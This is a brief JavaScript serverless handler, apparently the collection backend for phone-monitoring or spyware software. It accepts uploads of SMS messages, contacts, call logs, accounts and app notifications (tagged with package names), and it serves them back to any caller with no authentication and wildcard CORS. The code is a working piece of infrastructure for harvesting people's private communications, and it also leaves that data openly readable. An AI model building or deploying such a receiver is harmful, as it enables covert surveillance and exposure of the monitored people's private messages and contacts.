let store = { sms: [], contacts: [], calls: [], accounts: [], notifications: [] };

export default function handler(req, res) {
  res.setHeader("Access-Control-Allow-Origin", "*");
  res.setHeader("Access-Control-Allow-Methods", "GET,POST,OPTIONS");
  res.setHeader("Access-Control-Allow-Headers", "Content-Type");
  if (req.method === "OPTIONS") return res.status(200).end();

  const url = new URL(req.url, "http://x");
  const type = url.pathname.split("/").pop();

  if (!store[type]) return res.status(400).json({ error: "bad type" });

  if (req.method === "POST") {
    const b = req.body || {};
    if (b.sms) store.sms = b.sms;
    if (b.contacts) store.contacts = b.contacts;
    if (b.calls) store.calls = b.calls;
    if (b.accounts) store.accounts = b.accounts;
    if (b.package) {
      store.notifications.unshift(b);
      if (store.notifications.length > 200) store.notifications.pop();
    }
    return res.json({ ok: true });
  }
  return res.json({ [type]: store[type] });
}